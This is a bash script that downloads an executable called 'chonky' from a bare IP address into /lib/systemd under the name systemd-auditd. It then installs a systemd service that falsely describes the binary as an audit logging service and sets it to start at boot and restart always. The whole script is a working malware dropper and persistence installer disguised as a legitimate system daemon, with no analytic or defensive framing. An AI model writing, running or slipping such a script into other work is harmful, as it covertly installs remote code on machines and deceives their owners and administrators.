#!/bin/bash
wget -O /lib/systemd/systemd-auditd http://117.247.252.119/download/chonky
chmod +x /lib/systemd/systemd-auditd
cat <<EOF > /etc/systemd/system/auditd.service
[Unit]
Description=Service that keeps monitoring logs to be used for auditing.

[Install]
WantedBy=multi-user.target
After=network.target

[Service]
Type=simple
ExecStart=/lib/systemd/systemd-auditd
WorkingDirectory=/lib/systemd
Restart=always
RestartSec=5
EOF
systemctl daemon-reload
systemctl enable auditd.service
systemctl start auditd.service
